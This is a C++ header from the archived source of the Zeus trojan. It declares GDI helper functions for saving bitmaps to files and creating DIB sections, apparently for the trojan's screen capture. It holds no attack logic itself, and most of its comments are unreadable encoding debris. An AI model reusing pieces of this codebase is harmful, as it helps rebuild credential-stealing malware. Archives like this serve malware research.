/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ���������� ��� GDI/GDI+
*/
#pragma once

namespace Gdi
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� HBITMAP � ����.

    IN fileName     - ����.
    IN dc           - DC.
    IN bitmapHandle - HBITMAP.

    Return          - true - � ������ ������,
                      false - � ������ �������.
  */
  bool _saveBitmapToFile(const LPWSTR fileName, HDC dc, HBITMAP bitmapHandle);

  /*    Wrapper for CreateDIBSection, Kotra can more easily create DIBSection.

    IN dc - DC.
    IN width - the width of the bitmap.
    IN height - the height of the bitmap.
    OUT bitmapInfo - information about the bitmap, must be cleared through the Mem. May be NULL.
    OUT bitmapBits - data address bitmap.
    IN fileMap - Map-file object, or NULL.
    IN fileMapOffset - offset in fileMap.

    Return - the bitmap, or NULL.

    Note: The bitmap will always be in the format BI_RGB format 8/16/32.
  */
  HBITMAP _createDibSection(HDC dc, int width, int height, BITMAPINFO **bitmapInfo, void **bitmapBits, HANDLE fileMap, DWORD fileMapOffset);
};
